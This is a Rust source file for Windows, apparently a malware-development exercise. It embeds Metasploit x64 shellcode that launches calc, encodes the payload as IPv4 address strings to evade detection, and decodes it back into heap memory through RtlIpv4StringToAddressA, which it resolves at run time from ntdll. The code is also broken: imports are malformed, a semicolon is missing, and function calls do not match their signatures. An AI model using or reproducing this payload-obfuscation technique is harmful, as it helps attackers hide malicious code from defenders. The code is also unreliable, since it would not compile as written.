use std::{
    ptr::*,
    fmt::Write,
    ffi:CString,
};
use windows_core::s;
use windows::Win32::System::{
    Memory::{HeapAlloc, HeapFree, GetProcessHeap, HEAP_FLAGS},
    LibraryLoader::{GetModuleHandleA, GetProcAddress},
};

fn main() {

    // x64 calc metasploitable code !
    let raw_data: [u8; 272] = [
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
];

    if !generate_ipv4_output(&raw_data) {
        // if failed, then raw_data length isn't a multiple of 4
        std::process::exit(-1);
    }

    if !ipv4_deobfuscation() {

    }

    println!("[#] Press <Enter> To Quit ... ");
    let mut input = String::new();
    std::io::stdin()
        .read_line(&mut input)
        .expect("Failed to read line");
}



// Generate the IPv4 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer

/*
IPv4 Obfuscation
*/
fn generate_ipv4_output(shellcode: &[u8]) -> bool {
    if shellcode.is_empty() || shellcode.len() % 4 != 0 {
        return false;
    }

    let array_size = shellcode.len() / 4; // number of IP addresses (IP addr = 4 bytes (u8 * 4))

    print!("let ipv4_array = [\n\t"); // same as format! but printed to console

    let mut output = String::new();
    let mut counter = 0;

    // enumerate all of the ipv4 octets
    for (i, chunk) in shellcode.chunks(4).enumerate() {
        counter += 1;
        // each chunk is the 1 byte ipv4 octet
        let ip: String = format!("{}.{}.{}.{}", chunk[0], chunk[1], chunk[2], chunk[3]);

        if i == array_size - 1 {
            // last element
            write!(output, "\"{}\"", ip).unwrap();
        } else {
            // non-last elements (see the comma)
            write!(output, "\"{}\", ", ip).unwrap();
        }

        // add newline and tab every 8 elements for formatting
        if counter % 8 == 0 && i != array_size - 1 {
            output.push_str("\n\t");
        }
    }
    println!("{} \n];\n", output);
    true
}

/*
IPv4 Deobfuscation
*/
type RtlIpv4StringToAddressA = unsafe extern "system" fn (
    *const i8,          //PCSTR S
    i32,                //BOOLEAN strict 
    *const i8,          //PCSTR* Terminator
    *mut *const i8,     //PVOID Addr
    *mut u8,            //NTSTATUS
) -> i32;

// ipv4_array : array of ipv4 addresses returned from generate_ipv4_output() of type string slice array containg string slice
// d_address & d_size will be used to store the deobfuscated payload and size
fn ipv4_deobfuscation(ipv4_array: &[&str], d_address: &mut Option<Vec<u8>>, d_size: &mut usize) -> bool {
    let num_elements: usize = ipv4_array.len(); // number of ipv4 addresses
    let buff_size= num_elements * 4; // number of bytes

    // Allocate memory for the payload on the heap
    let buffer: *mut std::ffi::c_void = unsafe {
        HeapAlloc(GetProcessHeap().unwrap(), HEAP_FLAGS(0), buff_size)
    };

    if buffer.is_null() {
        println!("[!] HeapAlloc Failed");
        return false;
    }

    let mut tmp_buffer = buffer as *mut u8;
    


    // Get RtlIpv4StringToAddressA from ntdll.dll 
    let ntdll_result = unsafe {
        GetModuleHandleA(s!("ntdll.dll")) // use s! macro to handle null termination and type conversion automatically
    };

    // use match statement to handle result
    let ntdll_handle = match ntdll_result {
        Ok(handle) => handle, // On success, extract the handle
        Err(_) => {
            println!("[!] GetModuleHandleA Failed");
            unsafe { HeapFree(GetProcessHeap().unwrap(), HEAP_FLAGS(0), Some(buffer)) };
            return false;
        }
    };


    // Retrieve the function address inside of ntdll.dll
    let rtl_ipv4_func = unsafe {
        GetProcAddress(ntdll_handle,s!("RtlIpv4StringToAddressA"))
    };

    let rtl_ipv4_addr = match rtl_ipv4_func {
        Some(address) => address, // On success, retrieve the address
        None => {                                       // On failure, handle the error
            println!("[!] GetProcAddress Failed")
            unsafe { HeapFree(GetProcessHeap().unwrap(), HEAP_FLAGS(0), Some(buffer))};
            return false;
        }
    };


    let rtl_ipv4: RtlIpv4StringToAddressA = unsafe { std::mem::transmute(rtl_ipv4_func) };

    // Process each IPv4 address
    for ip in ipv4_array {
        let ip_cstr = match CString::new(*ip) {
            Ok(cstr) => cstr,
            Err(_) => {
                println!("[!] Failed to convert IP to CString: {}", ip);
                unsafe { HeapFree(GetProcessHeap().unwrap(), HEAP_FLAGS(0), Some(buffer)) };
                return false;
            }
        };
        
        let mut terminator: *const i8 = ptr::null();
        let status = unsafe {
            rtl_ipv4(
                ip_cstr.as_ptr(),
                0, // FALSE for Strict
                &mut terminator,
                tmp_buffer
            )
        };

        if status != 0 {
            println!("[!] RtlIpv4StringToAddressA Failed At [{}] With Error 0x{:08X}", ip, status);
            unsafe { HeapFree(GetProcessHeap(), 0, buffer) };
            return false;
        }

        tmp_buffer = unsafe { tmp_buffer.offset(4) };
    }

    // Convert to Vec and set output parameters
    let result = unsafe { Vec::from_raw_parts(buffer as *mut u8, buff_size, buff_size) };
    *d_address = Some(result);
    *d_size = buff_size;

    true


}